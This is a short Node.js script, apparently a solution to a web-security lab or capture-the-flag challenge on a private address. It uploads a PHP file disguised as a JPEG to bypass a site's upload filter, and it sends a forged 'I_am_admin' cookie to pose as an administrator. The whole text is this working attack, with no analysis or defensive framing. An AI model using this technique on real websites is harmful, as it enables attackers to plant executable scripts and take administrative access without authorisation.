import FormData from 'form-data';
import fs from 'fs';
import fetch from 'node-fetch';

const form = new FormData();

form.append('uploaded', fs.readFileSync('./script.php.jpg'), {
  contentType: 'image/jpeg',
  filename: 'script.php'
});

form.append('MAX_FILE_SIZE', '100000');
form.append('Upload', 'Upload');

const response = await fetch("http://192.168.1.39/?page=upload", {
  method: 'POST',
  headers: {
    ...form.getHeaders(),
    'cookie': 'I_am_admin=68934a3e9455fa72420237eb05902327',
    'Referer': 'http://192.168.1.39/?page=upload'
  },
  body: form
});

console.log(await response.text());
